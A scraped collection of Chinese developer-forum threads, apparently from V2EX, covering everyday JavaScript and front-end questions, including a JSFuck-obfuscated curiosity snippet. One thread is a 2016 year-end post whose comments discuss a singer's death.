successCallback();\r", "失败： failCallback();\r", "像这样的， debug 模式能实现？", " 我这个用在正式环境很久了，哪个先调先执行哪个， ready 是每次调用都会执行", " \r", "明白了，谢谢啊！还有就是想问一下刚才提到的 async 两次调用同一个 callback 会报错，这个的话该怎么办呢？", "  Promise 的状态是一次性的，一旦 resolve 或者 reject 后，再次调用就无效了。", " \r", "promise 我倒没试过这种情况，但 async 的确会报错的，因为参数的引用还是在的。我现在整个结构已经是 async 的了，改成 promise 估计不太行"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>项目里定义了这么一个函数：\ntest = function (one, two, three, four, five, six)｛｝里面有六个参数。</p>\n<p>然后调用的时候 test(one,two,function(){}.function(){},true){}只有两个对应的参数，然后是两个函数，最后一个 true\n怎么理解这里面的函数，还有最后一个 true 呢</p>\n</div></div>"], "reply": "6", "tittle": "JavaScript 如何理解函数参数", "comment": ["我不理解你不理解什么", " 定义的是 6 个参数，调用的时候只有五个，然后后面三个前面两个函数，后面一个 true ，分别对应的啥", " 后面的两个函数和 true 分别对应 three ， four ， five 。你的调用里 six 是 undefined 。", "one=one\r", "two=two\r", "three = function(){}\r", "four=function(){}\r", "five=true\r", "six=undefined", "arguments ", "函数可以作为参数传递，也可以作为返回值。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>本因有你，倍加珍兮！</strong></p>\n<p>曾经有段时间，整天播放器里放的都是本兮的歌，《你在看孤独的风景》被单曲循环了一遍又一遍；今天突然看到本兮去逝的消息，完全不愿意相信，这么可爱的音乐小精灵，上天太不公平了！</p>\n<p>2016 是非常特别的一年，吹过大风，走过大雨，有过哀伤，有过快乐，留下的更多的是，累也不说累的小成长！</p>\n<p><strong>风在说，雨在笑</strong></p>\n<p>那是个多情的季节，整个部门男男女女，打足鸡血，为了将产品推向一个新的高度，进行了为期 20 天的封闭式开发；那是一个偏远的郊区里的那一栋别墅，在那个风雨交加的夜晚，我们终于全部抵达了，之后的 20 个日日夜夜，吃喝拉撒——————请随意！</p>\n<p>江城的天气，永远都不在套路上；记得那是个凌晨两三点的时分，天一下变了脸，电闪雷鸣，大雨滂沱，肆无忌惮的下了几天来着，忘了，我只记得公司因此放了 3 天假，然后集体划小艇拿设备租了个临时办公的场所，或者在家远程办公，大家伙儿依然干的热火朝天！就凭这，老板是不是要给我们加年终奖！好吧。我们老板不看技术博客。</p>\n<p><strong>我这个小前端</strong></p>\n<p>前端的江湖风起云涌，今年依然势头大好，大浪淘沙，如今差不多只剩 Angular(2)、 React 、 Vue 三分天下；不管你接不接受，反正如今看来这已是不可逆的；学什么并不重要，突破舒适区，拓展思维的局限，才应该是理所应当的初衷；反观前端技术的发展，其实和每个前端的成长都是息息相关的，之前 Angular2 老是被吐槽体量太大，加上各种新奇的搞法，对新手来说颇有难度，可如今，人家 AOT 一走，摇树优化一 Rollup ，也算得上是轻量级的框架了，听说能小到 58K ，而这其中的变更与迭代，可以想象有多么强大的技术支撑，而这些强大的优化技巧，无疑也给前端注入了更多的能力，所以我们不仅仅是学习框架本身，更重要的转变思维方式，学到处理更复杂事物的能力；</p>\n<p>现在很流行全栈，虽然我和它还相隔十万八千里，但我想这应该作为职业规划中很重要的一部分，毕竟，未来谁知道呢！</p>\n<p>我想每个前端都应该学习 Nodejs ，而不管它是属于前端还是后端，我想作为一个前端来说，学习 Nodejs 最大的好处至少是：反哺前端；起初由于我 JavaScript 比较薄弱，加上公司主要用 jquery ，通篇看起来，代码很是零散，之后使用 Seajs 对其进行模块化改造后，稍有好转，但这远远不够；因为 Seajs 是 CMD 规范的代表，而前端的模块化规范又要追溯到 Commonjs 规范，而 Commonjs 规范如今又是在服务端由 Nodejs 发扬光大，所以要实现前端的模块化， Nodejs 很值得研究；相比来说，服务端的环境远远好于浏览器环境（额，突然好想鄙视 IE ）， JS 由此获得了更加长足的生命力，不仅能写 server ，还带领前端走进了自动化构建的时代；而我的初衷始终是反哺前端，比如 Nodejs 非常成熟的模块化体系，比如增进对 JS 异步机制的了解，比如基于 Nodejs 的各种构建工具，等等；前端虽然也不乏各种比较好的做法，但对 JS 的运用，相比 Nodejs 来说，都是小巫见大巫；所以，这种反哺作用是非常值得的！</p>\n<p>看看现在最流行的框架，不会点 Node 能行吗？当然还得懂点 ES6 ，虽然 ES6 有蛮多语法糖层面的东西，但不得不说，甜甜的还是相当美好的！虽然浏览器端很多地方还得顾及 IE78 这些个拖油瓶，但别忘了工具始终是最大的生产力，借助工具的力量， IE9+使用 ES6 不是事；好消息是， IE78 很快将会退出历史舞台，因为 SHA-1 验证过期后，本身的安全问题将是硬伤！</p>\n<p>好笑的是，由于产品的特殊性，今年差不多三分之一的时间我都是扒在 IE7891011 上，想想我这个刚挽起裤腿踏入前端的人，一下子就踩到了深水区，真的是万劫不复（<a href=\"http://famanoder.com/bokes/5839e76bd37f5e680891fb47\" rel=\"nofollow\">前端异常 — 跨终端实时追踪</a>），好在后端同学的积极研究，我还是熬过来了，<strong>厉害的队友总能使人快速的有所长进</strong>，比如最终留下来的 ErrorInspector ，虽然还有很多不足和亟待改进的地方，但在当时真的是挽救我于水火的好玩意儿！让我明白 try_catch 多么有必要，跨端、线上、随时追踪并及时反馈异常是多么有必要；从基础做起，这就是最好的例子；</p>\n<p><strong>Ending</strong></p>\n<p>最近再看 Koa2 ，相比 Express 来说，最大的优点就是实在太简洁！采用 JS 的未来标准 ES7 中的 async/await 来处理异步流程，同时很大程度上的支持 ES6 语法，加上中间件的概念，简洁而流畅，我想这将是对我前端很好的一次反哺机会，在这 2016 即将过完之际， Koa2 对我来说算得上是一个漂亮的 Ending ；这是一个简单的 base （<a href=\"https://github.com/famanoder/Koa2-base\" rel=\"nofollow\">https://github.com/famanoder/Koa2-base</a>），正打算用它改写我的个人小站，，希望能和大家一起学习交流！</p>\n<p>如果你已在路上，就勇敢的向前吧！</p>\n<p>原文来自：花满楼（<a href=\"http://famanoder.com/bokes/5863f3b25fecfe1c0f3a4305\" rel=\"nofollow\">http://famanoder.com/bokes/5863f3b25fecfe1c0f3a4305</a>）</p>\n</div></div>"], "reply": "32", "tittle": "再见， 2016（本兮）", "comment": ["这文风好奇怪。。", "不说话，改写字了…", "文不对题，而且流水账，但饱含感情，所以。。", "我是来看本兮的", "你前端国，在邪路上越走越远...", "我很纳闷，整天研究新轮子，会有时间创造生产力？", "前端路漫漫", "我也是特别喜欢本兮的《你在看孤独的风景》，大一大二基本上一直在循环播放这首歌，尤其是心情不好的时候。昨天才听到的本兮的事情，很痛心。。。", "我以为 本兮唱了首 再见， 2016", "本兮是谁？", "可怕，前段时间一直要摒弃”非主流的头衔“ 人没了都跑出来怀念自己的”非主流青春“\r", "没有认真的去关心故人，都是想借题发挥展示自己的，\r", "\r", "网易云本兮的歌以前评论点赞的 1K 就很多了 现在 3K 5K ，人没了都来支持了。\r", "\r", "不针对故人，只想嘲讽一些哪些平时道貌岸然说自己和非主流无关然后人没了又出来怀念自己非主流青春的人。\r", "\r", "还有....本文内容和本兮....到底有什么关系。。", "死的不明不白 就一句话盖过了 越短的问题越大啊", "跟她认识九年了 印象是很努力很坚强的人 突然就没了...", " \r", "无任何信息来源也不认识这个人，看一句话新闻，不是跳楼自杀就是酒驾车祸（自己是肇事者），或者死于性\r", "否则不会用这种说法，感觉以自杀概率最大\r", "\r", "其实就是公关公司傻逼了，“因故”这个文绉绉词本身就是我知道啥我不想让你知道的用法，这样关注度高的一塌糊涂，上一个公开说因故死亡的是谁？是不是那个嫖娼死了的人大代表取消资格时候？\r", "\r", "这种事儿，其实就是改用日常语气因意外事故去世，都不会给人引导向阴谋论，大部分会考虑是不是出了车祸啥的", "文风不对啊，看标题我以为是 fans 的悼念文章，没想到一笔带过写年终总结来着了...", "有些人死了才出名，虽然粉丝看了觉得我是错的，她很有名。嗯，我不认识。", "页脚部分的 rss 点击没反应", "我以为是回忆整个部门男男女女在多情的季节发生的事，没想到。。。", " 一个 90 后歌手，虽然唱歌就是类似于很多人说的哼哼唧唧的，但是对于这五六年以来青春期的人来说，很喜欢这种风格。类似风格的有单色凌、许嵩、徐良、汪苏泷、阿悄等这些人", "哎，好可惜", "不止我一个人喜欢她，顶贴", " 现实中认识的吗，有参加她的告别会吗", "据说是抑郁症，然后平安夜跳楼了。\r", "唉，有什么想不开的呢。愿在天之灵，会开开心心的吧~~~", "\r", "\r", "本兮的生前直播录屏，感觉一个多月前活生生一个人突然就没了，让人唏嘘不已", " 0708 年她还在新疆的时候认识的 我在深圳没去 在北京的共同的朋友去了 她朋友圈前几天还发着搬家之后的动态..", " 我已经看到点滴过敏,从 14 楼跳楼,17 楼跳楼及触电四个版本了", "[捧蜡烛][捧蜡烛]", "永远不知道怎么死的系列。许嵩微博遭殃了，什么社会。", "啥？本兮去世了？刚刚才把 pink gun 拷到车里，最近听的最多的除了双笙，发发就是本兮了。", "认识她也有四五年了 跟她也就见过两次,除了痛心之外我更不能理解的是为什么有些人,有些公司要靠这种事情来搞推广搞宣传,我在贴吧删了两天的帖子了,遇见几个借机推广自己微商的,推广什么“祭奠” App 的,连推广卡盟的都来了,然后还有一群不知道从哪个热搜追过来的使劲发假消息,把帖子给删了人家就说“看来真相真的就是 XXX 系列”,\"吧务拿钱系列\",\"百度被操控系列\" 还有一种借机发别人的信息来搞事情,借机黑别的明星 当然少不了那些冷嘲热讽的黑粉", " \r", "\r", "同本兮双笙。。\r", "\r", "双笙有一个好基友 囧菌，声音风格都挺像的，可以听听看", "挺喜欢她的歌的，好可惜，哎"]},
{"content": ["<div class=\"topic_content\">就比如说我点击了按钮 ” Install “ 对吧，那这时候我请求的 url 就去后端处理我的 install 请求对吧，那么我就想展示这个 install 的过程通过进度条展示出来。</div>"], "reply": "18", "tittle": "如何实现单击按钮后进度条开始走,同时执行后台的程序，\r\n当程序执行完成，进度条也就达到 100%", "comment": ["js ？ socket io 跟后端通信 或者虚假一点 第一次 random 进度 最后 完成的 callback 跑满", "每次递增 1/(2**n)", "前面 99%想怎么写怎么写，接到成功回调后，直接进度条 width 100%", "没有非常好的办法，三楼的想法比较赞成。", "本来都是这样的,前面 99%随意你,后面 1%才是关键", "要精确的话，后台程序异步执行的同时往缓存里面写进度，前端每隔一段时间请求进度值。", "你可以看看这个插件的逻辑： ", "做一个伪进度就可以了。等后端回来就直接 100%。", "对用户真正有用的进度条是能看到结束时间的进度条。想知道结束时间基本是不可能的，想知道当前进度，要实现起来也是异常困难的。所以你还是弄个菊花转转吧。", "分解成 N 个子任务，在队列中依次请求，每完成一个，进度增加 1/N", "ajaxForm", "用户想看进度条其实是有两层意思：\r", "1. 想知道预估结束时间。很多时候这个办不到。\r", "2. 想知道页面有没有死掉。这个简单。总之想办法让页面一直有反馈就行了，比如用户多次提交就提示用户耐心一点。", "道理很简单啦\r", "真的进度条只有在文件下载上传、压缩解压这种能准确衡量的情况下才能做出来\r", "其他都是假进度条，只有 0 和 100 之分，动画只是骗人用的", "后端用 chunked 格式回响应，随时返回进度，兼容性也不错。", "做一个 flash, 自动走到 100\r", "\r", "哈哈哈哈哈", "用 JS 库。。。很多", " 求教，有没有实现的案例？", " 你的后端是？一般后端框架都有处理的，有进度就往响应流里手动写入一点数据，完成再关闭。\r", "前端直接通过 XMLHttpRequest 监听 onreadystatechange 事件读服务器已发的数据，不用 jQuery 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://log.zvz.im/2016/12/30/utf8-in-javascript/\" rel=\"nofollow\">直接去读原文</a></p>\n<p>在 Javascript 中处理编码问题有时会令人烦恼。我最近一次遭遇就是在使用浏览器的 <code>atob</code> 和 <code>btoa</code> 函数时。这些函数用于二进制字符串和 Base64 ASCII 码之间的转换。但是用它们处理 Unicode 字符串时就挂了：</p>\n<pre><code>&gt; btoa('\\u0227');\nError: INVALID_CHARACTER_ERR: DOM\nException 5\n</code></pre>\n<p><a href=\"https://developer.mozilla.org/en/DOM/window.btoa#Unicode_Strings\" rel=\"nofollow\">MDN 上关于 <code>btoa</code> 的文档</a>指出下面<a href=\"http://ecmanaut.blogspot.com/2006/07/encoding-decoding-utf8-in-javascript.html\" rel=\"nofollow\">来自于 Johan Sundström 的函数</a>可以解决 Unicode 问题：</p>\n<pre><code>function encode_utf8(s) {\n  return unescape(endcodeURIComponent(s));\n}\n\nfunction decode_utf8(s) {\n  return decodeURIComponent(escape(s));\n}\n</code></pre>\n<p>用上这些函数后，<code>btoa</code> 就能够给出期望的结果了：</p>\n<pre><code>&gt; btoa(encode_utf8('\\u0227'));\n\"yKc==\"\n</code></pre>\n<p>Johan 的函数能正常工作，只是让人觉得有点像是黑魔法。所以我决定研究一下 <code>encode_utf8</code> 函数的各个部分，搞明白它是如何工作的。</p>\n\n<h2>encodeURIComponent</h2>\n<p><code>encode_utf8</code> 函数中先使用了 <code>encodeURIComponent</code> 。<code>encodeURIComponent</code> 在<a href=\"http://ecma-international.org/ecma-262/5.1/\" rel=\"nofollow\">最近的 ECMAScript 规范</a>中定义如下：</p>\n<blockquote>\n<p>encodeURIComponent 函数计算产生一个新的 URI ，其中的某些字符被替换为一个，二个，三个，或四个字节的 该字符 UTF-8 编码的转义序列。</p>\n</blockquote>\n<p>令我惊讶的是 <code>encodeURIComponent</code> 函数是与 UTF-8 编码绑定的。而不像其它语言的类似函数，编码方式是作为函数参数传入的。如果你本来就像使用 UTF-8 编码，当然没有问题，如果你想使用别的编码方式就不好使了（当然也有别的方法<a href=\"http://updates.html5rocks.com/2012/06/How-to-convert-ArrayBuffer-to-and-from-String\" rel=\"nofollow\">使用 ArrayBuffers 实现定长编码</a>）。</p>\n<p>这儿有个例子是对 Unicode 字符 U+0227 （ȧ，小写的拉丁字母 A 顶上加个点）使用 <code>encodeURIComponent</code> 函数：</p>\n<pre><code>&gt; encodeURIComponent('\\u0227');\n\"%C8%A7\"\n</code></pre>\n<p>结果是一个<a href=\"http://en.wikipedia.org/wiki/Percent-encoding\" rel=\"nofollow\">百分号编码</a>的字符串，每一段表示该字符串 UTF-8 编码的一个字节。查找 <a href=\"http://www.fileformat.info/info/unicode/char/227/index.htm\" rel=\"nofollow\">Unicode 字符 U+0227 的文档</a>，我们可以验证该字符 UTF-8 编码的十六进制形式就是 0xC8 0xA7 。</p>\n<p>ECMAScript 的定义很模糊，它说 <code>encodeURIComponent</code> 会替换“某些字符”，却没说明这些字符。不过一个 <a href=\"http://monsur.hossa.in/temp/encodeURIComponent.html\" rel=\"nofollow\">快速的试验</a>显示，任何大于 0x7E 的字符都会被编码，所以我觉得说任何非 ASCII 字符都会被 <code>encocodeURIComponent</code> 编码肯定不会错。由于百分号编码方式只使用了数字 0-9 ，字母 A-F 以及 ‘%’ 字符，可以保证输出结果一定是 ASCII 字符串。</p>\n<p>现在我们可以先暂停一下。<code>btoa</code> 函数所需要的就是 ASCII 字符串，<code>encodeURIComponent</code> 函数就已然够用了：</p>\n<pre><code>&gt; btoa(encodeURIComponent('\\u0227'));\n\"JUM4JUE3\"\n</code></pre>\n<p>不过这样做有一些缺陷。首先，输出的结果字符串与输入的字符串的二进制变了。这只是个原始字节的一个编码版本。这可能在与其它系统交互时造成困难和烦恼。</p>\n<p>第二个缺陷是，<code>encodeURIComponent</code> 函数生成了一个更长的字符串。单个 Unicode 字符采用 UTF-8 编码最多占用 4 个字节，经过 URI 编码后就能产生一个 12 个字符长的串。之后在经过 Base64 编码（能使字符串变得更长），最终输出的结果比输入的字符能长许多倍。为了解决字符串长度问题， Johan 找来了 <code>unescape</code> 函数。</p>\n<p><a href=\"https://log.zvz.im/2016/12/30/utf8-in-javascript/\" rel=\"nofollow\">阅读完整文章</a></p>\n</div></div>"], "reply": "4", "tittle": "小议 Javascript 中的 UTF-8", "comment": ["赞一个先", "非常感谢，真是受益匪浅！", "看到最后发现不是原创，是译文", " 😅"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码如下：\n(f =&gt;(x =&gt; f(y =&gt; x(x)(y)))(x =&gt; f(y =&gt; x(x)(y))) )(get =&gt; node =&gt; Array.from(node.childNodes)     .filter(node =&gt; node.nodeType === Node.ELEMENT_NODE).reduce((depth, node) =&gt; Math.max(depth, get(node) + 1), 1) )(document.documentElement)</p>\n<p>微博链接： <a href=\"http://weibo.com/1074886493/EodjO45ln?type=comment#_rnd1482937548088\" rel=\"nofollow\">http://weibo.com/1074886493/EodjO45ln?type=comment#_rnd1482937548088</a></p>\n</div></div>"], "reply": "15", "tittle": "这个前端代码太鬼畜了，完全看不懂了~有大神说一下吗？", "comment": ["手机阅读。没啥格式化工具。\r", "\r", "目测是遍历 dom 树  返回最大深度\r", "\r", " 关键字\r", "箭头函数  立即执行函数", "去看看 Y Combinator ，然后应该就懂了……", "不知道把代码写成这样有什么意义", "作用就跟一楼说那样了， 获得 dom 树最大深度\r", "其实执行一下就知道了， 一般这种就是从右往左边看\r", "附图\r", " ", "美化一下：\r", "(f =>\r", "  (x => f(y => x(x)(y)))\r", "  (x => f(y => x(x)(y))) \r", ")\r", "(get => \r", "  node => \r", "    Array.from(node.childNodes)\r", "      .filter(node => node.nodeType === Node.ELEMENT_NODE)\r", "      .reduce((depth, node) => Math.max(depth, get(node) + 1), 1) \r", ")\r", "(document.documentElement)\r", "\r", "(f =>\r", "  (x => f(y => x(x)(y)))\r", "  (x => f(y => x(x)(y))) \r", ")\r", "这种形式是 Y Combinator ，作用是让匿名函数递归自身。\r", "\r", "node => \r", "    Array.from(node.childNodes)\r", "      .filter(node => node.nodeType === Node.ELEMENT_NODE)\r", "      .reduce((depth, node) => Math.max(depth, get(node) + 1), 1) \r", "\r", "这里就是找 node 的后代元素嵌套深度的，后面把 document.documentElement 传进来。", "本想美化一下，没想到排版还是瞎眼…", "试下 markdown\r", "\r", "```\r", "function(abc) {\r", "    alert(\"Hello!\");\r", "}\r", "```", "注意力从前端挪走几年了. 现在浏览器支持的 javascript 引擎是什么版本? 什么样的浏览器能支持这种函数式的 js 语法?", " 主要的浏览器现在都支持了，而且 ES6 规范里规定了 tail call optimization", "这还算鬼畜。这才叫鬼畜\r", "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()", " 居然真的能执行哈哈哈哈哈哈哈", " 可怕，试了下真可以", "jsfuck", " 卧槽，神马原理。。", "箭头函数没有原函数语法清晰 我觉得"]},
{"content": ["<div class=\"topic_content\">我测试了很久，都会出现其中一个面不透明，然后另外少一个页的视觉效果。\r<br>求 3D 达人解答。\r<br>\r<br><a target=\"_blank\" href=\"http://jsfiddle.net/iamtaotao/1vp1he8y/\" rel=\"nofollow\">http://jsfiddle.net/iamtaotao/1vp1he8y/</a></div>"], "reply": "4", "tittle": "Three.js 生成的立方体，如何给每个面进行均匀的透明度让其通透？", "comment": ["不知在每个 Material 最后加上 “ depthTest:false ” 是否会好一些呢？\r", "\r", "我的理解是在默认情况下 depth test 会打开，如果一个面被另一个面遮住了，那那个被遮住的面就不会被渲染了；如果取消 depthTest 应该能够解除不透明的问题。\r", "\r", "但是仅仅取消 depthTest 也无法得到正确的结果，正确的结果是应该将每个面按遮挡顺序排序，先渲染离摄像机远的再渲染离摄像机近的，也就是说，面的渲染顺序会因为摄像机的顺序不同而不同。需要一个面一个面地渲染而不能将整个立方体一起送给渲染管线（不然就会按照模型中的顺序来渲染了） …", " 我试试，先感谢", "  想法基本是对的.\r", "depth testing 和 blend 是两个层面的问题.\r", "先进行 depth testing ,它是基于三维模型进行的,这一步就会丢弃被遮挡的 fragment.\r", "blend 则是基于颜色缓冲进行的,是把当前渲染的帧和上一次渲染的帧进行混合.\r", "\r", "传统解法是:\r", "保持开启深度测试.\r", "先绘制所有不需要透明度的**物体**\r", "再从远到近绘制每一个需要透明度的\"曲面\".", " 我来测试一个，待会发一个例子。"]},
{"content": ["<div class=\"topic_content\">写了一个简单的页面，使用 bulma.css ， chrome ， Safari 测试均正常，上传服务器后用 iPhone 访问却没有触发框架自带的响应式，这可能是什么情况？\r<br>\r<br>PS ：感觉 bulma 比 bootstrap 好看一些，各位有什么轻量，好看的 css 框架推荐吗？</div>"], "reply": "2", "tittle": "为什么电脑浏览器改变窗口宽度会触发响应式，手机访问却不行？", "comment": ["目测是没加 meta viewport", " \r", "还真是，加了一行\r", "<meta charset=\"UTF-8\" name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r", "就好了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>案例地址： <a href=\"http://www.orzzone.com/react-webpack-boilerplate/\" rel=\"nofollow\">http://www.orzzone.com/react-webpack-boilerplate/</a></p>\n<p>描述：大图上方一堆小导航图，现在的效果是鼠标移动到小导航图上后小导航图回瞬间变大，期望的效果是这个变大应该是有个过渡效果的。 CSS 部分应该是没问题的。</p>\n<p>相关 js 代码详见下面这个 jsx 文件第 103 行前后（小导航图变大是通过在第 103 行添加 scale 这个 css 类实现的）\n<a href=\"https://github.com/Yakima-Teng/react-webpack-boilerplate/blob/master/src/views/slider-2d-js.jsx\" rel=\"nofollow\">https://github.com/Yakima-Teng/react-webpack-boilerplate/blob/master/src/views/slider-2d-js.jsx</a></p>\n<p>相关 CSS 代码详见下面这个样式文件第 77 行：\n<a href=\"https://github.com/Yakima-Teng/react-webpack-boilerplate/blob/master/src/styles/details/slider-2d-js.less\" rel=\"nofollow\">https://github.com/Yakima-Teng/react-webpack-boilerplate/blob/master/src/styles/details/slider-2d-js.less</a></p>\n<p>这个问题放了很久了，想趁着放假解决一下。</p>\n</div></div>"], "reply": "6", "tittle": "react 问题， css transition 效果没实现，不知道怎么解决", "comment": ["transform 无过渡动画", " 是说 transform 这个属性不支持过渡吗？这个属性是支持过渡的，这个页面点击第二个标签菜单后鼠标放到六面体中某个图片上，那个图片是有个放大的过渡效果的，也是对 transform 属性做的动画^_^", "transform 搭配 transition 才有过度效果", " 我已经加了 transition 的啊 /(ㄒoㄒ)/~~", "你的 key={uuid.v4()} 直接讓 react 渲染新的 DOM 上去\r", "就沒有 class 改變這狀態, 自然沒過渡效果了", " 谢谢帮助。确实是这个问题，本地处理了下已经能行得通了。\r", "\r", "结贴。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>注意，本文是用英文书写，作者水平虽不高。但是，我想大家应该能看懂：</p>\n<p><img alt=\"pjax react\" src=\"https://github.com/aleen42/PersonalWiki/raw/master/Programming/JavaScript/Framework/react/react_and_pjax/logo.png\"></p>\n<p><strong>Pjax</strong>, combined with powerful React</p>\n<p>详情请看原文： <a href=\"https://github.com/aleen42/PersonalWiki/blob/master/Programming/JavaScript/Framework/react/react_and_pjax/react_and_pjax.md\" rel=\"nofollow\">https://github.com/aleen42/PersonalWiki/blob/master/Programming/JavaScript/Framework/react/react_and_pjax/react_and_pjax.md</a></p>\n</div></div>"], "reply": "8", "tittle": "如果你想把 Pjax 运用到 React 里，这里有些我实践中所遇到的问题", "comment": ["Pjax 是模仿单页面，想做单页面应用用 React 全家桶即可", " 😆 明白", "想了想还是来说两句吧\r", "1.  你做的东西和 react-router 功能非常重叠，就是 load 东西的时候用 pushState ，但是实际上这个就是正常的 a tag 的模拟，用 router 更好，因为和 load 之间分离更清楚，和 component 之间解耦更好，参数传递可以做语义化的 link 什么的。\r", "2.  如果你一定要做，做成 high order component ，这样可以和 dom 解耦。\r", "3.  还有就是你那个改根据 viewName 来加载文件这样做不是很好，如果你知道 nginx 的话，用 try_files\r", "server {\r", "  ...\r", "  location / {\r", "    try_files $uri /index.html\r", "  }\r", "}\r", "或者对于 express 来说就是 app.use('*', function(req, res){\r", "     res.sendFile(path.resolve(__dirname, 'public', 'index.html'))\r", "})\r", "大概就是这样。", " 👍👍小弟受教", " 採用 viewName 來定義每一個頁面的確會存在手動定義而導致開發效率慢的問題。但是關於解耦的問題，可能目前還沒對比過，需要做更深一步的理解。在此先謝謝大哥", "Pjax 开发繁琐，推荐 Turbolinks 。", " +1", " 好的，我以後實踐一下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前用 hammer.js, 发现这货滑动操作是有延迟的, 且滑动时, 有距离的限制.\n我曾经找到过如何配置 hammer.js 但,现在又找不到配置的方法了.\n有没有一个类库或插件, 有各种手式, 又没有这些问题的.</p>\n<p>最近,我用原生 js 写了这么一个功能: 商品详情页分上下两部份, 拖到上下部份之间的边界时, 会减少拖动速度. 当拖到一不能再拖了, 放开, 则自动滚动到页面的另一部份, 也就是实现通过拖动操作, 上部分与下部分切换.</p>\n<p>这次开发还好, 不需要去兼容火狐与 IE.但总不能每次都这么写大量的代码.</p>\n<p>有些功能 hammer.js 并没有解决, 比如拖动过界了,弹回去.   还有快速划动,有个惯性滚动的过程,而这个过程需要是能够通过按住屏幕停止的.</p>\n<p>现打算做一个列表,列表的组元全用 position:absolute 定位.组元会被一个中间区弹性吸附. 列表有快速拨动的功能.</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "求个类库插件.有没有方便使用的触控插件", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题：</p>\n<pre><code>__d('BitMap', [], (function a(b, c, d, e, f, g) {\n    var h = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_';\n\n    function i() {\n        'use strict';\n        this.$BitMap1 = [];\n    }\n\n    i.prototype.set = function(l) {\n        'use strict';\n        this.$BitMap1[l] = 1;\n        return this;\n    };\n\n    i.prototype.toString = function() {\n        'use strict';\n        var l = [];\n        for (var m = 0; m &lt; this.$BitMap1.length; m++)\n            l.push(this.$BitMap1[m] ? 1 : 0);\n        return l.length ? k(l.join('')) : '';\n    };\n\n    i.prototype.toCompressedString = function() {\n        'use strict';\n        if (this.$BitMap1.length === 0) return '';\n        var l = [],\n            m = 1,\n            n = this.$BitMap1[0] || 0,\n            o = n.toString(2);\n        for (var p = 1; p &lt; this.$BitMap1.length; p++) {\n            var q = this.$BitMap1[p] || 0;\n            if (q === n) { m++; } else {\n                l.push(j(m));\n                n = q;\n                m = 1;\n            }\n        }\n        if (m) l.push(j(m));\n        return k(o + l.join(''));\n    };\n\n    function j(l) {\n        var m = l.toString(2),\n            n = '0'.repeat(m.length - 1);\n        return n + m;\n    }\n\n    function k(l) {\n        var m = (l + '00000').match(/[01]{6}/g),\n            n = '';\n        for (var o = 0; o &lt; m.length; o++)\n            n += h[parseInt(m[o], 2)];\n        return n;\n    }\n    f.exports = i;\n}), null);\n</code></pre>\n</div></div>", "<div class=\"topic_content\">没说清楚，只需要看 toCompressedString 这个函数的作用就好了，先谢过</div>"], "reply": "12", "tittle": "求指教这段 JS 代码是在做什么", "comment": ["base64 和图片相关\r", "你这代码没头没尾的, 让人猜?", "函数的命名方式也是奇葩", "这代码是压缩后的代码又格式化过的吧，建议看找源代码看啊  压缩会优化命名.....", " 这是压缩后的代码，函数命名全变了", "感觉像压缩字符串的。", "感觉像压缩二进制数据的，如果是，作者技术不错啊", "用行程编码方式将二进制压缩成字符串, j 是具体的转换函数。", "上面一条说得不太对， 应该是类似 base64 那样的转换编码。", "bitmap 只有 0 和 1 ， toCompressedString 里面的 l 记录了连续的 0 或者 1 的次数， j 函数想字符串前面加的 0 是为了能够区分连续的两个次数。 o + l.join('')是压缩后的 01 字符串", "压缩字符串啊。。", "toString 对二进制数据进行 base64 。 toCompressedString 对数据进行压缩处理然后进行 base64 。不过这个压缩处理要看压缩对象了，他这个处理方式是直接根据二进制中 0 ， 1 的重复次数进行压缩。如果分布不是很连续感觉压缩之后打了很多。", " \r", " \r", " \r", "感谢各位"]},
